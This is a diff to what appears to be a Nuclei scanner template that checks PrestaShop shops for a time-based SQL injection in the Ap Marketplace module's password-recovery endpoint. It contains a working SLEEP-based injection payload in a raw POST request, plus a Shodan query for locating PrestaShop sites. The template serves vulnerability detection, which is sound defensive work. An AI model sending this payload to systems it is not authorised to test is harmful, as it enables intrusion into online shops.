@@ -1,7 +1,7 @@
 id: prestashop-apmarketplace-sqli
 
 info:
-  name: PrestaShop Ap Marketplace SQL Injection
+  name: PrestaShop Ap Marketplace - SQL Injection
   author: mastercho
   severity: high
   description: |
@@ -9,7 +9,6 @@ info:
   reference:
     - https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/#pll_switcher
   metadata:
-    max-request: 1
     verified: true
     shodan-query: http.component:"Prestashop"
   tags: prestashop,sqli
@@ -17,18 +16,21 @@ info:
 http:
   - raw:
       - |
+        @timeout: 20s
         POST /m/apmarketplace/passwordrecovery HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         Referer: {{RootURL}}
         X-Requested-With: XMLHttpRequest
 
-        email=" AND (SELECT 3472 FROM (SELECT(SLEEP(6)))UTQK)-- IGIe&submit_reset_pwd=
+        email="+AND+(SELECT+3472+FROM+(SELECT(SLEEP(6)))UTQK)--+IGIe&submit_reset_pwd=
 
+    host-redirects: true
+    max-redirects: 3
     matchers:
       - type: dsl
         dsl:
           - 'duration>=6'
-          - 'status_code == 200'
-          - 'contains(header, "PrestaShop")'
+          - 'contains(body, "module-apmarketplace-passwordrecovery")'
         condition: and
+# digest: 490a0046304402203c646c3d3dd93ac479a310fafb3036af740a8bb6c8efee12a05f4a63e29c2a0502207384b65ae3b915080f88522d12e04c540a8684dd52ac4bdb3ceb8134d8c1bc3d:922c64590222798bb761d5b6d8e72950
